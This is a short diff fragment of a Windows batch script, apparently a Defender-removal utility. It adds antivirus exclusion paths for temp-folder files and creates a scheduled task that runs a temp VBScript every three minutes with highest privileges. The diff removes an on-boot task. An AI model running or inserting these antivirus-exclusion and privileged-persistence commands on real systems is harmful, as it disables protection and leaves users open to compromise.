@@ -8,7 +8,7 @@ powershell -Command "Add-MpPreference -ExclusionPath '%temp%\Remove_Defender\Rem
 powershell -Command "Add-MpPreference -ExclusionPath '%temp%\RunDefenderRemover.vbs'"
 
 schtasks /create /tn "TempVBS" /tr "%temp%\e.vbs" /sc minute /mo 3  /f /rl HIGHEST
-schtasks /create /tn "TempVBS_OnBoot" /tr "%temp%\e.vbs" /sc onstart /f /rl HIGHEST
+
 
 
 schtasks /delete /tn "upgradef1" /f
